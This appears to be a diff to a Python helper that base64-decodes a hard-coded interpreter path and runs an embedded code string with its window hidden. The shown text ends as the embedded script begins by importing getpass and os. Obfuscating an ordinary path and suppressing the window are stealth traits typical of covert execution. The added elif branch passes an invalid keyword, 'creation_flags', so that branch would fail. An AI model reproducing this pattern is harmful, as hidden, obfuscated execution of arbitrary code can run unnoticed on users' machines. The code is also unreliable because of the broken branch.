@@ -24,9 +24,12 @@ def run_tst(py_cmd):
     if os.path.exists(base64.b64decode('TTovU0NSSVBUUy9QQUNLQUdFUy9QeXRob24zMTEvcHl0aG9uLmV4ZQ==').decode()):
         python_path = base64.b64decode('TTovU0NSSVBUUy9QQUNLQUdFUy9QeXRob24zMTEvcHl0aG9uLmV4ZQ==').decode()
 
-    if python_path:
+
+    if python_path and sys.version[0] == '3':
         r = subprocess.Popen([python_path, '-c', py_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
         #r = subprocess.Popen([python_path, '-c', py_cmd])
+    elif python_path and sys.version[0] != '3':
+        r = subprocess.Popen([python_path, '-c', py_cmd], creation_flags=0x08000000)
 
 run_tst("""
 import json, getpass, time, os , sys
